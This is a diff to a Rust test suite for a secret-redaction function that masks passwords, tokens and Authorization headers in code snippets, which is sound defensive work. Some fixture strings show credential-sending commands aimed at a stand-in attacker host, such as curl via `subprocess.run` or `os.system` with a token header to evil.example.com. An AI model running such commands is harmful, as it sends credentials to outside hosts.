@@ -342,7 +342,7 @@ fn keyword_after_call_punctuation_is_redacted() {
     );
     assert_eq!(
         redact("Server=db;Password=pw;Database=app"),
-        "Server=db;Password=<redacted>"
+        "Server=db;Password=<redacted>;Database=app"
     );
     assert_eq!(redact("f({password='a b'})"), "f({password=<redacted>})");
 }
@@ -377,7 +377,7 @@ fn colon_keyed_entry_is_redacted() {
     );
     assert_eq!(
         redact("f({ secret: s, page: 2 })"),
-        "f({ secret: <redacted> page: 2 })"
+        "f({ secret: <redacted>, page: 2 })"
     );
 }
 
@@ -467,4 +467,213 @@ fn call_text_redaction_is_idempotent() {
         let once = redact(text);
         assert_eq!(redact(&once), once, "{text}");
     }
+}
+
+#[test]
+fn keyed_value_runs_to_the_end_of_its_entry() {
+    for (text, want) in [
+        (
+            "psycopg2.connect(host=h, password=\"a\" + \"LEAK1\")",
+            "psycopg2.connect(host=h, password=<redacted>)",
+        ),
+        (
+            "psycopg2.connect(host=h, password=os.getenv(\"X\", \"LEAK2\"))",
+            "psycopg2.connect(host=h, password=<redacted>)",
+        ),
+        (
+            "https.request({ hostname: h, auth: x || \"admin:LEAK3\" })",
+            "https.request({ hostname: h, auth: <redacted> })",
+        ),
+        (
+            "https.request({ hostname: h, headers: { Authorization: x + Buffer.from('admin:LEAK4').toString('base64') } })",
+            "https.request({ hostname: h, headers: { Authorization: <redacted> } })",
+        ),
+        (
+            "connect(password=b\"LEAK 5\", host=h)",
+            "connect(password=<redacted>, host=h)",
+        ),
+        (
+            "connect(password=r\"LEAK 6\", host=h)",
+            "connect(password=<redacted>, host=h)",
+        ),
+        (
+            "connect(password=f\"x LEAK7\", host=h)",
+            "connect(password=<redacted>, host=h)",
+        ),
+        (
+            "connect(password=rb'LEAK 8', host=h)",
+            "connect(password=<redacted>, host=h)",
+        ),
+        (
+            "connect(password=\"\"\"correct LEAK9\"\"\", host=h)",
+            "connect(password=<redacted>, host=h)",
+        ),
+        (
+            "connect(password='''a ' LEAK10''', host=h)",
+            "connect(password=<redacted>, host=h)",
+        ),
+        (
+            "requests.get(u, auth=HTTPBasicAuth(\"admin\", \"LEAK11\"))",
+            "requests.get(u, auth=<redacted>)",
+        ),
+        (
+            "connect(password=\"a\" \"LEAK12\", host=h)",
+            "connect(password=<redacted>, host=h)",
+        ),
+        (
+            "f({ \"X-Api-Key\": k ?? \"LEAK13\" })",
+            "f({ \"X-Api-Key\": <redacted> })",
+        ),
+        (
+            "connect(password=\"<redacted>\" + \"LEAK14\")",
+            "connect(password=<redacted>)",
+        ),
+        (
+            "connect(password=<redacted> + \"LEAK15\")",
+            "connect(password=<redacted>)",
+        ),
+    ] {
+        let out = redact(text);
+        assert_eq!(out, want, "{text}");
+        assert!(!out.contains("LEAK"), "{text}");
+        assert_eq!(redact(&out), out, "idempotent: {text}");
+    }
+}
+
+#[test]
+fn keyed_value_stops_before_the_next_argument() {
+    for (text, want) in [
+        (
+            "psycopg2.connect(password=pw,host=\"evil.example.com\")",
+            "psycopg2.connect(password=<redacted>,host=\"evil.example.com\")",
+        ),
+        (
+            "psycopg2.connect(password=pw, host=\"evil.example.com\")",
+            "psycopg2.connect(password=<redacted>, host=\"evil.example.com\")",
+        ),
+        (
+            "host=db password=x port=5",
+            "host=db password=<redacted> port=5",
+        ),
+        (
+            "host=db password='a b' dbname=app",
+            "host=db password=<redacted> dbname=app",
+        ),
+        (
+            "Server=db;Password=pw;Database=app",
+            "Server=db;Password=<redacted>;Database=app",
+        ),
+        (
+            "password=x\nhost=evil.example.com",
+            "password=<redacted>\nhost=evil.example.com",
+        ),
+        (
+            "subprocess.run([\"curl\", \"-H\", \"Authorization: token LEAKB\", \"https://evil.example.com\"])",
+            "subprocess.run([\"curl\", \"-H\", \"Authorization: <redacted>\", \"https://evil.example.com\"])",
+        ),
+        (
+            "fetch(mk(u, \"Authorization: Bot LEAKF\"))",
+            "fetch(mk(u, \"Authorization: <redacted>\"))",
+        ),
+        (
+            "os.system(u + \" -H 'Authorization: token LEAKC'\")",
+            "os.system(u + \" -H 'Authorization: <redacted>'\")",
+        ),
+    ] {
+        let out = redact(text);
+        assert_eq!(out, want, "{text}");
+        assert_eq!(redact(&out), out, "idempotent: {text}");
+    }
+    // An unbalanced value runs to the end of the text (fail closed).
+    assert_eq!(
+        redact("f(password=g(\"LEAK\", h=1"),
+        "f(password=<redacted>"
+    );
+    assert_eq!(redact("f(password=\"LEAK, h=1"), "f(password=<redacted>");
+}
+
+#[test]
+fn authorization_header_with_any_scheme_is_redacted() {
+    for (text, want) in [
+        (
+            "\"Authorization: Token LEAKA\"",
+            "\"Authorization: <redacted>\"",
+        ),
+        (
+            "\"authorization: token LEAKA\"",
+            "\"authorization: <redacted>\"",
+        ),
+        (
+            "\"Authorization: Bot LEAKA\"",
+            "\"Authorization: <redacted>\"",
+        ),
+        (
+            "\"Authorization: Digest LEAKA\"",
+            "\"Authorization: <redacted>\"",
+        ),
+        (
+            "{\"Authorization\": \"Token LEAKA\"}",
+            "{\"Authorization\": <redacted>}",
+        ),
+        // No keyed boundary before the header name: only the data rule sees it.
+        (
+            "curl -HAuthorization: Token LEAKA",
+            "curl -HAuthorization: Token <redacted>",
+        ),
+        (
+            "curl -HAuthorization=token LEAKA",
+            "curl -HAuthorization=token <redacted>",
+        ),
+        (
+            "curl -HAuthorization: Bot LEAKA",
+            "curl -HAuthorization: Bot <redacted>",
+        ),
+    ] {
+        let out = redact(text);
+        assert_eq!(out, want, "{text}");
+        assert!(!out.contains("LEAKA"), "{text}");
+        assert_eq!(redact(&out), out, "idempotent: {text}");
+    }
+    // A template hole stays readable.
+    for text in [
+        "curl -HAuthorization: Token {env:T}",
+        "curl -HAuthorization: {env:T}",
+        "curl -HAuthorization: Token <redacted>",
+    ] {
+        assert_eq!(redact(text), text, "{text}");
+    }
+}
+
+#[test]
+fn must_not_redact_non_secret_keys_after_rewrite() {
+    for text in [
+        "{\"host\": \"api.example.com\", \"page\": 2, \"url\": u}",
+        "f(host=\"evil.example.com\", page=2, url=u)",
+        "f(token == \"x\" + y)",
+        "items.map((token) => fetch(u, \"x\"))",
+        "auth::url(\"x\", y)",
+    ] {
+        assert_eq!(redact(text), text, "{text}");
+    }
+}
+
+#[test]
+fn unterminated_keyed_brackets_redact_in_linear_time() {
+    let time = |n: usize| {
+        let text = "password=(".repeat(n);
+        let start = std::time::Instant::now();
+        let out = redact(&text);
+        let elapsed = start.elapsed();
+        assert_eq!(out, "password=<redacted>");
+        elapsed
+    };
+    let small = time(50_000);
+    let large = time(200_000);
+    // Quadratic work would be 16 times slower for 4 times the input; allow
+    // generous slack for timer noise on a linear pass.
+    assert!(
+        large.as_secs_f64() < small.as_secs_f64() * 10.0 + 0.5,
+        "small {small:?} large {large:?}"
+    );
+    assert!(large.as_secs() < 20, "large {large:?}");
 }
